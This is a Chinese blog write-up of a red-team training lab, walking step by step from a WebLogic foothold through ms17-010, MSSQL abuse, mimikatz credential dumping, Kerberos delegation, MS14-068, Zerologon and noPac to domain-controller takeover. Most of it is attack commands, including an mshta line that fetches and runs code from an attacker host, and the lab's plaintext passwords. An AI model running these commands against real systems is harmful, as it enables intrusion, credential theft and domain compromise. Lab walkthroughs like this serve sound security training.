---
title: 渗透攻击红队靶场
date: 2021-12-24 11:16:25
categories: 渗透测试
tags: 靶场
---

### 简介

本靶场由渗透攻击红队saulGoodman制作，集成ms14-018、ms17-010、约束委派等多个漏洞可利用。

感兴趣的可到渗透攻击红队公众号领取靶场，顺便关注下这位作者的知识星球，人家整个靶场也不容易。

<!--more-->

<img src="http://qn.laohuan.xin/WechatIMG2.png" style="zoom:67%;" />

### 0x1 立足点

1.常规端口扫描，发现开放7001端口,为weblogic服务

![](http://qn.laohuan.xin/Snipaste_2021-11-13_14-42-21.png)

2.检测weblogic相关漏洞，存在多个漏洞。

<img src="http://qn.laohuan.xin/Snipaste_2021-11-13_15-00-11.png" style="zoom: 67%;" />

3.使用cve-2019-2725上线msf

使用msf hta模块,当然也可使用powershell上线

 `exploit/windows/misc/hta_server`

远程命令执行，成功上线

`mshta http://192.168.1.9:8080/WJw1Bh77010.hta`

![](http://qn.laohuan.xin/Snipaste_2021-11-13_15-51-36-mshta%E4%B8%8A%E7%BA%BF.png)

4.查看存在双网卡

![](http://qn.laohuan.xin/Snipaste_2021-11-13_15-57-04-ipconfig.png)

且为工作组环境，无域

`net config workstation`

![](http://qn.laohuan.xin/Snipaste_2021-11-13_15-58-09-%E5%B7%A5%E4%BD%9C%E7%BB%84%E7%8E%AF%E5%A2%83.png)

5.添加路由

`run get_local_subnets`

`run autoroute -s 10.10.20.0/24`

`run autoroute -p`

![](http://qn.laohuan.xin/Snipaste_2021-11-13_16-04-40-%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1.png)

6.添加socks代理

前几天发现了一款代理工具，顺便试一试。

[Venom](http://github.com/Dliv3/Venom.git)

服务端开启监听

`./admin_linux_x64 -lport 9999 `

上传agent，连接服务端

`agent.exe -rhost 192.168.1.9 -rport 9999`

查看节点

`show`

进入节点1

`goto 1`

开启socks代理，监听8888端口

`socks 8888`

![](http://qn.laohuan.xin/Snipaste_2021-11-13_16-35-32-venom.png)

### 0x2 横向Win7

1.查看路由表,发现一台10.10.20.7的机器

`arp -a`

![](http://qn.laohuan.xin/Snipaste_2021-11-13_16-02-47-arp.png)

2.上传ladon扫描内网，发现10.10.20.0段除了weblogic那台服务器，就只剩一台地址为10.10.20.7的win7,且存在ms17_010

* `ladon64.exe 10.10.20.0/24 onlinepc` 
* `ladon64.exe 10.10.20.0/24 ms17010` 
* `ladon64.exe 10.10.20.7 portscan`

![](http://qn.laohuan.xin/Snipaste_2021-11-13_19-35-35.png)

3.win7不出网，使用ms17_010正向shell拿下win7

<img src="http://qn.laohuan.xin/Snipaste_2021-11-20_13-36-56.png" style="zoom:67%;" />

4.发现存在域**redteam.red**

`systeminfo`

查看域用户 `net user /domain`

![](http://qn.laohuan.xin/Snipaste_2021-11-20_13-50-35.png)

5.查看域控，发现域控主机名**owa**，地址为10.10.10.8

* `net time /domain`
* `net group "domain controllers" /domain`
* `nltest /DCLIST:redteam`
* `ping owa`

![](http://qn.laohuan.xin/Snipaste_2021-11-20_14-02-51.png)

6.查询域管理员，为administrator

![](http://qn.laohuan.xin/Snipaste_2021-11-20_14-06-42.png)

7.查询进程，无域管进程，无法token窃取

![](http://qn.laohuan.xin/2021-11-23_04-5%E8%BF%9B%E7%A8%8B.png)

8.抓取win7密码 **Saul:admin!@#45**

`load kiwi`

`creds_all`

![](http://qn.laohuan.xin/2021-11-24_05-32-%E6%8A%93%E5%AF%86%E7%A0%81.png)

### 0x3 数据库服务器

1.查询SPN信息,发现存在exchange、sqlserver等服务。

`setspn -T redteam.red -q */*`

![](http://qn.laohuan.xin/2021-11-26_06-35spn.png)

2.或者使用fscan

`fscan64.exe -h 10.10.10.0/24`

![](http://qn.laohuan.xin/2021-11-24_06-02-fscan.png)		

可以看到数据库服务器为10.10.10.18这台机器，且fscan已经扫描出来存在**sa:sa**的弱口令

3.也可以使用msf的sqlserver爆破模块

先添加路由`run autoroute -s 10.10.10.0/24`

`auxiliary/scanner/mssql/mssql_login`

![](http://qn.laohuan.xin/2021-11-27_04-01sa%E5%AF%86%E7%A0%81.png)

4.已经拿到sqlserver口令，使用xp_cmdshell执行命令

`auxiliary/admin/mssql/mssql_exec`

![](http://qn.laohuan.xin/2021-11-27_04-16.png)

可以执行，但权限太小

5.使用clr正向shell拿下数据库服务器

`exploit/windows/mssql/mssql_clr_payload`

![](http://qn.laohuan.xin/2021-11-27_04-21sql%E4%B8%8A%E7%BA%BF.png)

6.使用ms14_058提升权限

`exploit/windows/local/ms14_058_track_popup_menu`

![](http://qn.laohuan.xin/2021-11-27_06-34%E6%8F%90%E6%9D%83.png)

成功提升至系统权限

7.抓取密码 **sqlserver:Server12345**

`load kiwi`

`creds_wdigest`

![](http://qn.laohuan.xin/2021-12-09_06-10.png)

### 0x4 域控

#### 1. 约束委派

1.查询设置了约束委派的用户(需域内任意账户密码,前期已获取win7账户密码)

```bash
proxychains3 ldapsearch  -LLL -x -H ldap://10.10.10.8:389 -D "saul@redteam.red" -w 'admin!@#45'  -b dc=redteam,dc=red "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" | grep -iE "distinguishedName
```

![](http://qn.laohuan.xin/2021-12-10_06-15ldap.png)

sqlserver用户配置了约束委派，且密码也已获取，可尝试约束委派攻击

2.使用kekeo请求TGT

工具地址：[kekeo](http://github.com/gentilkiwi/kekeo/)

`tgt::ask /user:sqlserver /domain:redteam.red /password:Server12345 /ticket:sqlserver.kirbi`

![](http://qn.laohuan.xin/2021-12-10_06-48-%E7%94%B3%E8%AF%B7TGT.png)

3.使用申请的TGT伪造administrator的ticket

`tgs::s4u /tgt:TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/owa.redteam.red`

![](http://qn.laohuan.xin/2021-12-10_06-55-%E8%AE%BF%E9%97%AE%E5%9F%9F%E6%8E%A7ST.png)

4.使用mimikatz导入伪造的票据

先清空内存中的票据 `KLIST PURGE`

`kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~owa.redteam.red@REDTEAM.RED.kirbi`

成功访问域控 `dir \\owa\c$`

![](http://qn.laohuan.xin/2021-12-10_07-04-%E5%AF%BC%E5%85%A5ST2.png)

#### 2. ms14-068

工具地址：[ms14-068.exe](http://github.com/abatchy17/WindowsExploits/tree/master/MS14-068)

1.利用前提已获取域内一账户密码，且未打补丁**KB3011780**

获取sid `whoami /user` 或者 `wmic useraccount get name,sid`

2.伪造证书

`MS14-068.exe -u saul@redteam.red -p admin!@#45 -s S-1-5-21-1359007890-1682372173-1631803504 -d owa.redteam.red`

3.清空凭据

`klist purge`

![](http://qn.laohuan.xin/2021-12-06_00-24.png)

4.使用mimikatz导入生成的证书

`kerberos::ptc TGT_saul@redteam.red.ccache`

5.退出mimikatz,成功访问域控

`dir \\owa\c$`

![](http://qn.laohuan.xin/2021-12-06_00-40.png)

6.或者使用goldenPac直接获得一个shell（ms14-068+psexec）

工具地址：[impacket-example-windows](http://github.com/maaaaz/impacket-examples-windows)

`goldenPac.exe redteam.red/saul:admin!@#45@owa.redteam.red`

![](http://qn.laohuan.xin/2021-12-07_05-00.png)

#### 3. CVE-2020-1472(谨慎使用)

1.使用exp将域控密码置空

`python3 cve-2020-1472-exploit.py owa 10.10.10.8`

![](http://qn.laohuan.xin/2021-12-13_07-02.png)

2.获取hash

`python3 secretsdump.py redteam.red/owa\$@10.10.10.8  -just-dc -no-pass`

![](http://qn.laohuan.xin/2021-12-13_07-04.png)

3.获得administrator的hash,直接psexec

`python3 psexec.py administrator@10.10.10.8 -hashes aad3b435b51404eeaad3b435b51404ee:ccef208c6485269c20db2cad21734fe7`

![](http://qn.laohuan.xin/2021-12-13_07-07.png)

**注意**：此方法可能导致脱域，获取权限后请将域控密码还原

还原请参考链接[http://www.jianshu.com/p/525be0335404](http://www.jianshu.com/p/525be0335404)

#### 4. CVE-2021-42287 & CVE-2021-42278

	补丁：

* KB5008602
* KB5008380

1.直接脚本小子一把梭 [noPac](http://github.com/Ridter/noPac)

检查漏洞情况,不使用ldap协议会报错

`python3 scanner.py redteam.red/sqlserver:Server12345  -dc-ip 10.10.10.8 -use-ldap`

![](http://qn.laohuan.xin/2021-12-14_22-29.png)

2.直接获取域控shell

`proxychains python3 noPac.py redteam.red/saul:'admin!@#45'  -dc-ip 10.10.10.8  -dc-host owa  -shell --impersonate administrator -use-ldap`

![](http://qn.laohuan.xin/2021-12-18_14-03-nopac1.png)

![](http://qn.laohuan.xin/2021-12-18_14-03-nopac2.png)

3.也可以使用sam_the_admin

exp: [sam_the_admin.py](http://github.com/WazeHell/sam-the-admin)

`python3 sam_the_admin.py 'redteam/saul:admin!@#45' -dc-ip 10.10.10.8 -shell`

![](http://qn.laohuan.xin/2021-12-18_13-57.png)

#### 其他

或者可以在dc上把win7账户saul加入管理组，获得域管权限

`net localgroup administrators /add redteam.red\saul`

![](http://qn.laohuan.xin/2021-12-18_16-19.png)

dsync导出hash

`lsadump::dcsync /domain:redteam.red /all /csv`

![](http://qn.laohuan.xin/2021-12-18_16-20.png)

hash传递拿下域控，抓取域管密码

![](http://qn.laohuan.xin/2021-12-18_17-41.png)

### 0x5 参考链接

* [http://www.jianshu.com/p/525be0335404](http://www.jianshu.com/p/525be0335404)

* [http://mp.weixin.qq.com/s/dcYbIfLwN-Aw0Z9XxQSGkQ](http://mp.weixin.qq.com/s/dcYbIfLwN-Aw0Z9XxQSGkQ)

* [http://blog.csdn.net/lhh134/article/details/104139081](http://blog.csdn.net/lhh134/article/details/104139081)

* [http://www.jianshu.com/p/525be0335404](http://www.jianshu.com/p/525be0335404)

  
